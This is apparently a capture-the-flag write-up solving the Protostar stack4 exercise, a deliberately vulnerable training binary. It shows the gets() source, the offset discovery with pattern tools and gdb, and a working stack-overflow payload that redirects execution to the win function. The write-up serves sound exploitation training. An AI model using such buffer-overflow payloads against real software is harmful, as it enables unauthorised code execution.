---
title: Protostar - Stack4
description: My writeup on stack4 challenge.
categories:
 - binary exploitation
tags: binary exploitation, protostar
---

You can find the protostar there > [Protostar](https://exploit-exercises.lains.space/protostar/){:target="_blank"}

Let's check the source code :

```bash
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

We have a function `win`, a variable `buffer` with 64bytes buffer and the vulnerable function `gets`

`gets` ->  doesn’t check while getting bytes.

Let's run the binary.

```bash
user@protostar:/opt/protostar/bin$ ./stack4
pwn 
```

It takes an input, let's check it is vulnerable.

```bash
user@protostar:/opt/protostar/bin$ python -c 'print "A" * 100' | ./stack4
Segmentation fault
```

Now let's find the offset.

```bash
$ ./pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

user@protostar:/opt/protostar/bin$ gdb -q ./stack4
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) r
Starting program: /opt/protostar/bin/stack4 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
(gdb) 

$ ./pattern_offset.rb -q 0x63413563
[*] Exact match at offset 76
```

Perfect, now let's find the address of `win` function.

```bash
user@protostar:/opt/protostar/bin$ objdump -d ./stack4 | grep win
080483f4 <win>:
```

Let's make the exploit now.

```python
>>> from pwn import *
>>> p32(0x080483f4)
b'\xf4\x83\x04\x08'
```

```bash
user@protostar:/opt/protostar/bin$ python -c 'print "A" * 76 + "\xf4\x83\x04\x08"' | ./stack4
code flow successfully changed
Segmentation fault
````
